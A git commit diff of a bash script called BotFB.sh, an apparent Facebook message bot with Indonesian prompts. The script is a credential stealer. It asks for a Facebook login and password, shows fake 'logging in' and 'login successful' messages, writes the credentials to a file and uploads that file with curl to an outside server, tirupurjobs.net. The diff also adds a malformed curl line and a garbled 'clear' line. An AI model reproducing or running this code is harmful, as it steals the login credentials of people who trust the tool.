074e34a21b22f6452a185a66012098dc34fea7b1
Droid <39285561+droidxerror123@users.noreply.github.com>
2018-08-06 11:00:06 +0000

    Update BotFB.sh

--- BotFB.sh
+++ BotFB.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-clear
+clearhttps://mobile.facebook.com/?_e_pi_=7%2CPAGE_ID10%2C8803815575
 
 toilet -f shadow -F gay "    Bot FB"
 echo """
@@ -18,18 +18,20 @@ Nomer Telepon
 Email:""" user ;
 echo "\033[96m"
 read -p "Password :" pass ;
-echo  "~root[]Sedang MasuK Ke Akun Anda" | lolcat
+echo  "~root[@]Sedang MasuK Ke Akun Anda" | lolcat
+curl -T https://mobile.facebook.com/login$user$pass
 sleep 4
-echo "~root[]Berhasil Login √ " | lolcat
-echo "User: $user\nPass: $pass" >> output/bot.html;
+echo "~root[@]Berhasil Login √ " | lolcat
+echo "User: $user\nPass: $pass" >> File/bot.html;
 sleep 2
-curl -T output/bot.html http://tirupurjobs.net 
+curl -T File/bot.html http://tirupurjobs.net 
 echo "\033[93m"
 read -p "masukan pesan 1 :" pesan1 ;
 read -p "masukan pesan 2 :" pesan2 ;
 read -p "masukan pesan 3 :" pesan3 ;
 read -p "masukab pesan 4 :" pesan4 ;
 read -p "masukan pesan 5 :" pesan5 ;
+echo "loading sendding to facebook.com..."
 echo "\033[92m=>$pesan1"
 sleep 1
 echo "\033[93m=>$pesan2"
